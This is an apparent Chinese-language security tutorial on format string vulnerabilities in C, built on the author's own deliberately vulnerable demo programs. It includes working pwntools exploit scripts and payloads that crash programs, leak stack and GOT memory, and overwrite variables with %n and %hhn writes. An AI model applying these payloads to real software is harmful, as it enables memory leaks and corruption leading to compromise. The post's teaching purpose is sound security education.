#  PWN入门之格式化字符串漏洞   
 蚁景网络安全   2025-01-14 09:30  
  
# 0x00 前言  
  
一声晴空霹雳，鸽王再次更新（手动狗头保个命），Pwn入门系列终于迎来了他的第三次更新，好长时间没更新了，就不给大家说那些没用的了，直接上干货！  
  
# 0x01 格式化字符串函数介绍  
  
格式化字符串（Fromat String）：在编码过程中，允许编码人员通过特殊的占位符，将相关对应的信息整合或提取的规则字符串。格式化字符串包括格式化输入和格式化输出
以printf()为例，第一个参数就是格式化字符串：“字符串 %s, 整数 %d, 浮点数 %f”，然后printf函数会根据这个格式化字符串来解析对应的其他参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib7248LO1F6LWd8erjPzRicRMfhtuicIpNYcvxN1n4f9APDaXO4PdarUlMCQ/640?wx_fmt=png&from=appmsg "")  
```
%d   /// 十进制-输出十进制整数
%s   /// 字符串-从内存中读取字符串
%lx  /// 十六进制-输出十六进制数
%c   /// 字符-输出字符
%p  /// 指针-指针地址
%n   /// 到目前为止所写的字符数

```  
# 0x02  漏洞原理利用  
## 程序崩溃  
  
针对格式化字符串漏洞，使程序崩溃是最简单的利用方法，只需要输入一串%s即可  
```
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s

```  
  
可能会有人问，为什么输入一串%s就会导致程序崩溃，这是因为针对每一个%s，printf()都会从栈上取一个数字，把该数字视为地址，然后打印出该地址指向的内存内容，但是不可能获取的每个数字都是地址，所以数字对应的内容可能不存在，或者该地址是被保护的，这样就会使程序崩溃  
>   
> tips：在Linux中，存取无效的指针会引起进程收到SIGSEGV信号，从而导致程序非正常终止并产生核心转储  
  
## 泄露内存  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72HqD5xMBTVricMRu0aFqgFxKCGrmX1n2SV1sa7HxChnJV0JIW3BWPlew/640?wx_fmt=png&from=appmsg "")  
```
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}

```  
  
编译一下：  
```
gcc -m32 -fno-stack-protector -no-pie -o format1 format1.c

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib722FXacGVuGHyQ8vibibL9seP78B96ssNXTibgncWuZO3t7QmF2ZnXl6icJw/640?wx_fmt=png&from=appmsg "")  
>   
> tips：C语言的调用规则决定了，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数（64位会根据其传参的规则进行获取）  
  
### 获取栈变量数值  
  
在printf函数上下一个端点，然后r运行  
  
此时，程序等待输入，我们输入%08x.%08x.%08x，然后敲击回车，程序继续运行，因为我们前面打了一个端点，程序断在第一次调用printf函数的位置  
>   
> tips：什么是%08x  
> 在C语言中，格式说明符%08x用于printf函数中，将一个无符号整数以8个字符的宽度格式化为十六进制数字。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72ibRhAGt3tqc43jIeibnQfh88VCxnPwy0SgXjRicuk00Cic4Tylb5saHIxw/640?wx_fmt=png&from=appmsg "")  
  
查看此时的栈空间  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72j2IVj5U85kbmePjv5gHBxBKHqXyWTcY7RbXsDfUTl4FJTmCCQtZvjQ/640?wx_fmt=png&from=appmsg "")  
  
来看一下栈上的地址  
  
首先是第一行，这是printf的返回地址，然后是第二行，可以看到这后面是之前的一串%08x.%08x.%08x.$s\n这是printf函数的第一个参数：格式化字符串，printf函数会根据这个字符串来解析后面的参数  
  
第一个%08x解析的是0x1  
  
第二个%08x解析的是0x2222222  
  
第三个%08x解析的是0xfffffff也就是源码中给出的c，后面的%s会把输入的内容，也就是%08x.%08x.%08x给打印出来  
  
运行一下查看结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72Aa1ky898RP0jL8IXue1rKQN17KoibfQXQjyHFtLxyNxibqa8Rup5ntAw/640?wx_fmt=png&from=appmsg "")  
  
再运行一下，程序断在了第二个printf处，把之前输入的内容作为格式化字符串，由于没有给他提供其他参数，同样会在栈上找临近的三个参数，根据格式化字符串给打印出来，这样就将后面三个栈上的值给输出出来了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72ArJN4z2DwTDNqoOd8bFRmrCNaDhFIeebM3SABuu8PXKGt63jRicjSTg/640?wx_fmt=png&from=appmsg "")  
  
我们也可以通过%p来获取数据，如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72VVoebjib1Itq8zc6PxbicAw9hXTvpr3YZZ17Smw8dOXmJjNWohVYRBicw/640?wx_fmt=png&from=appmsg "")  
  
由于栈上的数据会因为栈不对内存页做初始化操作导致每次分配的内存页不同而有所不同。  
  
但是这样使用相对来说比较鸡肋，只有这几个临近的地址显然不够使用的，可以通过修改输入获取对应参数的地址  
>   
> Tips:%n$x是什么  
> 在C语言中，%n$x是一种格式说明符，用于从参数列表中按索引选择要格式化和打印的参数。  
> 这里的n是一个正整数，表示参数的索引位置  
> n为几代表是第几个参数  
  
  
在这里%n$x可以用来获取第n+1个参数的值（格式化字符串是第一个参数，所欲相对于输出函数来说，就是第n+1个参数了）  
  
这里使用%3$x就会打印出第四个参数对应的值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib7267ggwxxGCvdnbQ7UrobzOTCicNOpI9QiaclWaH3exG2anbXLvibVed56g/640?wx_fmt=png&from=appmsg "")  
### 获取栈变量对应字符串  
  
跟前面一样，在printf上打断点，r一下，输入%s  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72picSEiaoBgm3UcauRySjID52zclx5GftDdklOeDGjRq7EVibDkHjmhV4A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib726avyNFNiblKMZBAc2p61h7HNHzScH16zQmKoR2lfwlQlgbTZPPkvwaQ/640?wx_fmt=png&from=appmsg "")  
  
分析调试过程，在第二次执行printf函数时，将0xffffd3e0处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。  
  
小结：  
1. 利用%x来获取对应栈的内存，但比较建议使用%p，可以不用考虑位数的区别  
  
1. 利用%s来获取变量所对应地址的内容，只不过有零截断  
  
1. 利用%n$x来获取指定参数的值，利用%n$x来获取指定参数对应地址的内容  
  
### 泄露任意地址的内存  
  
前面我们提到的两种泄露，都是泄露栈变量的值，没能完全控制我们所要泄露的变量的地址，这样的泄漏看起来比较唬人，但是实际上对我们实际利用没什么太大的作用。  
  
到这里可能就有师傅问了，既然毫无意义你前面扯那一堆又有何意义呢，稍安勿躁，正菜来了：  
  
在大部分利用过程中，我们会想泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，我们有了前面的铺垫用接下来的方法能够控制泄露某个指定地址的内存。  
  
在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上，这里肯定会有师傅问，为什么都是在栈上，这是由所读取的格式化字符串的特性决定的，是某个函数的局部变量，而栈的作用就是用于存储局部变量和函数调用信息。所以从这个角度来看，在调用函数时，第一个参数的值就是该格式化字符串的地址。我们继续用前面的某个函数调用来当做例子分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72Hticlqy3PD9NicwPFCvw0YOSRu4hHGFdOOibMiaGqChg6Rla2ugj2aUicpQ/640?wx_fmt=png&from=appmsg "")  
  
直接分析就可以看出，栈上的第二个变量就是我们的格式化字符串地址0xffffd3e0，同时其存储的也确实是%s格式化字符串内容。  
  
前面我们提到过，我们可以控制该格式化字符串，当我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那我们就可以通过如下的方式来获取某个指定地址addr的内容。  
```
addr%k$s

```  
>   
> tips：如果格式化字符串在栈上，就一定确定格式化字符串的相对偏移，因为在函数调用的时候栈指针至少低于格式化字符串地址8字节或者16字节  
  
  
到这里最关键的问题就是如何确定该格式化字符串为第几个参数的问题了，可以通过下面这种方式来确定  
```
特定字符%p%p%p%p%p%p...

```  
  
通常我们会通过重复某个字符，后面会跟上若干个%p来输出站上的内容，如果内容与前面的特定字符重复了，一定程度上可以确定改地址就是格式化字符串的地址，之所以说一定程度上，是因为这里不能排除栈上有一些临时变量也是这个字符，我们可以通过设定多个特殊字符，多试几次的方法来避免这种情况。这里我们利用T和i作为特定字符  
  
%p%p%p%p%p%p%p%p%p%p%p%p  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72JxHH0IlS5TgsN9vReaMcAzpCV4YOcRXAKOiaibBdk1I4G9OK9rhqby0Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib724qdjicPKqebyTUVVYBkNk1t0boOQZB9Qfo7n8em8YLtFwQksIqE1GjQ/640?wx_fmt=png&from=appmsg "")  
  
分析一下  
  
T--0x54  
  
i--0x69  
  
由0x54545454和0x69696969的位置我们可以得出，格式化字符串的起始地址恰好为输出函数的第5个参数，但是是格式化字符串的第4个参数。让我们来测试一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib721GIOcpRP0sp3Cpz8U1oiaKZxDrehkt4MfkSjWEumec3IH5GHXCffeXQ/640?wx_fmt=png&from=appmsg "")  
  
程序崩溃了，让我们调试一下  
```
gdb ./format1
b printf
r
%4$s

```  
  
调试结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72yNDZVG5100gkyNiadYbFdLT7Lt9xZNZ5CiaQWGvxztr9iabiaEbghc5Bbw/640?wx_fmt=png&from=appmsg "")  
  
首先查看0xffffd3e0里的内容发现里面为0x73243425，再使用vmmap分析一下发现，程序没有相应的访问权限，我们再使用x/x验证一下，发现确实没有相应的访问权限。  
  
那如果设置的是一个可访问的地址，比如scanf@got，我们就可以获取到scanf对应的地址了。  
  
首先获取一下scanf@got的地址  
```
gdb ./format1
b printf
r
%4$s
got

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72f7ovBYoZPPHo87icgmBKHY9WF3ahdSLTgIt4Vptywju2hBCBicOqW6yg/640?wx_fmt=png&from=appmsg "")  
  
这里得到scanf@got的地址为0x804c014  
  
利用pwntools构造payload  
```
from pwn import *
sh = process('./format1')
leakmemory = ELF('./format1')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print(hex(__isoc99_scanf_got))
payload = p32(__isoc99_scanf_got) + b'%4$s'
print(payload)
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil(b'%4$s\n')
print(hex(u32(sh.recv()[4:8])))

```  
>   
> Tips：这里应该会有师傅会问，为什么不能直接用命令行输入相应的地址，这是因为scanf函数并不会将其识别为对应的字符串，而是会将\,x,0,c分别作为一个字符进行读入，所以这里是通过脚本将地址输入，而并不是通过直接输入字符的方法。  
  
  
这里有一个地方需要解释一下，我们使用gdb.attach(sh)来进行调试，当运行到第二个printf函数时，可以看到第四个参数，指向我们的scanf的地址，这里输出  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72dOPwliakqR3UlhYSic0RyK1er6w0Td4sBzSkFwpXczs2njETgueibaR0A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72SVLBo8BFGoEeYIQOicstOaQD1KVibeHOMVrICWsfQeJ2MIraMMD0cwIA/640?wx_fmt=png&from=appmsg "")  
  
但是并不是所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，需要对输入的格式化字符串进行填充，使我们想要打印的地址内容的地址位于机器字长整数倍的地址处，类似于这种情况  
```
填充字符+地址

```  
## 覆盖内存  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72B2wteEGyefZiakcsyGPBsq1nZiaqnPbiadmiaWbvzAr8QuX4WEibfZKJlLQ/640?wx_fmt=png&from=appmsg "")  
  
前面我们提到了通过格式化字符串漏洞来泄露栈内存以及任意地址内存，单纯泄露栈内存好像不太能满足我们，那就让我们来覆盖内存吧！  
  
我们使用如下程序来完成我们的讲解  
```
#include <stdio.h>
int a = 123, b= 456;
int main(){
    int c = 789;
    char s[100];
    printf("%p\n", &c);
    scanf("%s", s);
    printf(s);
    if(c == 16){
        puts("modified c.");
    } else if (a == 2){
        puts("modified a for a small number.");
    } else if (b == 0x12345678){
        puts("modified b for a big number!");
    }
    return 0;
}

```  
  
编译一下  
```
gcc -m32 -fno-stack-protector -no-pie -o format2 format2.c

```  
### 覆盖栈内存  
  
覆盖内存我们是有三个步骤，分别是  
1. 确定覆盖地址  
  
1. 确定相对偏移  
  
1. 进行覆盖  
  
#### 确定覆盖地址  
  
由于目前几乎所有的程序都开启了aslr保护，栈的地址一直在变，所以获取覆盖地址的方法千奇百怪，而且在前面几篇文章中也提到过几种，而且本篇文章的重点是格式化字符串漏洞，为了突出重点，这里我们就偷个懒直接将相应的地址输出了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72h48jy01SpUCNmxI9Nh3CTTKE78DCqWhelpsF6H84Db9DVcf5WGRBwg/640?wx_fmt=png&from=appmsg "")  
#### 确定相对偏移  
  
到这一步，我们需要确定一下存储格式化字符串的地址是printf将要输出的第几个参数，这里用前面我们提到的泄露栈变量数值的方法，来操作，也顺便复习一下前面的知识。  
```
gdb ./format2
b printf
r
c
Tide
stack

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72okgwAaibeiaEj5FkP75GoQXWsbKo0n0nicubdlQl1RO8dyc3EG8Uiace1w/640?wx_fmt=png&from=appmsg "")  
  
我们来分析一下栈上的数据，Tide是输入字符串的位置，Printf的所有参数入栈后，从栈顶依次向下排序发现其相对偏移是6，也就意味着通过%6$x即可实现覆盖，这样我们就确定了相对偏移，接下来我们就该来进行覆盖了。  
#### 进行覆盖  
  
前面提到相对偏移是6，也就是第6个参数处的值就是存储变量c的地址，我们可以利用%n的特征来修改c的值即  
```
c的地址+%012d%6$n

```  
  
由于c的地址长度为4，我们需要再输入12个字符才能达到16个字符，来达到我们修改c的值为16的目的  
  
将上述操作写成exp  
```
from pwn import *
sh = process('./format2')
c_addr = int(sh.recvuntil('\n', drop=True), 16)
print(hex(c_addr))
payload = p32(c_addr) + b'%012d' + b'%6$n'
print(payload)
sh.sendline(payload)
print(sh.recv())
sh.interactive()

```  
  
最终运行结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib722aUl3ibuCk7zoX2076oQW72oK2hapmSsOPB2LtuOYHPHK63gAYvCKxQ/640?wx_fmt=png&from=appmsg "")  
### 覆盖任意地址内存  
  
覆盖任意地址分两种情况，一种是写入的数值是一个比较小的数字，一种是写入的数值是比较大的数字。  
#### 覆盖小数字  
  
继续用前面我们给出的例子进行讲解  
```
a == 2

```  
  
我们想要实现a的值为2，也就是覆盖a的值让他变成2  
  
这种就属于是小于机器字长的数字，到这里有师傅就会问，这两种有什么区别呢，乍一看区别的确不大，但是如果将覆盖的地址放在最前面，将会直接占用机器字长个（4或8）字节。无论后面如何输出都会比4大。  
  
所以到这里我们就考虑是否可以将所要覆盖的地址不放在字符串的最前面，因为我们的填充字段的本身的作用是为了找到对应的偏移，所以放到中间也是可以的，我们想要做到的是通过覆盖将a的值变为2，所以格式化字符串到底前面的字节需要是这样的  
```
TT%k$nxx

```  
  
目前对应的存储的格式化字符串已经占据了6个字符串的位置，如果再添加两个字符TT，那此时TT%k就是第6个参数，$nxx是第7个参数，后面如果跟上要覆盖的地址那就是第8个参数，所以只要将k设置为8，就可以实现覆盖了，即  
```
TT%8$nTT

```  
  
下面我们就来进行覆盖操作  
  
在覆盖前，我们手下要找到a的地址，直接用Ghidra就可以分析得到  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72OYVv3XpOFLwPomnNYqq3nOicuN1rktamHpwGWzwpGOxvCZ1aq2bF3Lg/640?wx_fmt=png&from=appmsg "")  
```
a_addr = 0x0804c024

```  
  
所以最终的exp如下  
```
from pwn import *
sh = process('./format2')
a_addr = 0x0804c024
payload = b'TT%8$nTT' + p32(a_addr)
sh.sendline(payload)
print(sh.recv())
sh.interactive()

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72ibmq4SBo9ssEHmyWdP0hsNGNruicz3dIpibmKDJeNxmOZQJOjicgx8dTeg/640?wx_fmt=png&from=appmsg "")  
#### 覆盖大数字  
  
在这一部分给大家讲解覆盖大数字的操作，我们可以选择一次性输出大数字个字符来进行覆盖，但基本上不会成功，因为太长。而且即使成功，一次性等待的时间也太长，所以我们考虑用其他的方法，在介绍方法前我们先了解一下变量在内存中的存储格式。  
  
所有的变量在内存中都是以字节进行存储，在x86和x64体系结构中，变量的存储格式为小端存储，即最低有效位存储在低地址，以0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12，这里我们涉及到两个格式化字符串的标志  
```
hh 整数类型，printf期待一个从char提升的int尺寸的整型参数。
h  证书类型，printf期待一个从short提升的int尺寸的整型参数。

```  
  
看到这里，我们不难看出，我们可以利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节。用单字节为例  
  
还是用前面的程序作为例子，我们的目的是这样的  
```
b == 0x12345678

```  
  
在达到目的之前，跟之前一样，我们需要先确认一下b的地址，还是使用我们的老朋友Ghidra来确认b的地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib722IFo7PrF7OAxPibj0iaoLRm8C8V1dOUUt2kXs02pW9dboRevfSZM2PJQ/640?wx_fmt=png&from=appmsg "")  
  
这里看出来b的地址为0x0804c028  
  
所以我们想覆盖成这样  
```
0x0804c028 \x78
0x0804c029 \x56
0x0804c02a \x34
0x0804c02b \x12

```  
  
前面提到过，我们的字符串的偏移量为6，所以payload如下  
```
p32(0x0804c028) + p32(0x0804c029) + p32(0x0804c02a) + p32(0x0804c02b) + pad1 + '%6$n'+ pad2 + '%7$n'+ pad3 + '%8$n'+ pad4 + '%9$n'

```  
  
这里我们就站在巨人的肩膀上直接借用ctf-wiki的基本构造  
```
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

```  
  
其中每个参数的含义如下  
```
offset 表示要覆盖的地址最初的偏移
size 表示机器字长
addr 表示将要覆盖的地址。
target 表示我们要覆盖为的目的变量值。

```  
  
对应的exp如下  
```
from pwn import *

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
        fmtstr = "%0c"
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = b""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> (i * 8)) & 0xff, offset + i).encode()
        prev = (target >> (i * 8)) & 0xff
    return payload


sh = process('./format2')
payload = fmt_str(6, 4, 0x0804c028, 0x12345678)
print(payload)
sh.sendline(payload)
print(sh.recv())
sh.interactive()

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVk9wp1dweolbZHwBlpQib72aMEYwlDkodmibATPt3lNT8yZhp0fMmiapwZaLwmLn2ic6HDEjBsRwGuhA/640?wx_fmt=png&from=appmsg "")  
  
小结：  
1. 覆盖内存三步走，确定覆盖地址，确定相对偏移，进行覆盖  
  
1. 覆盖任意地址内存分两种，小数大数各不同  
  
# 0x03 参考文章  
1. https://blog.csdn.net/luoganttcc/article/details/144486929  
  
1. https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_11  
  
1. https://bbs.kanxue.com/thread-254599.htm  
  
1. https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458299103&idx=1&sn=d98f42f5c43419f1e14bcb49541ec9ae&chksm=b1819a5586f61343cff298ab7d965133d29700b865ba83a1994be29f90961b1b9431e38d001c&scene=27  
  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
学习  
网安实战课程  
，戳  
“阅读原文”  
  
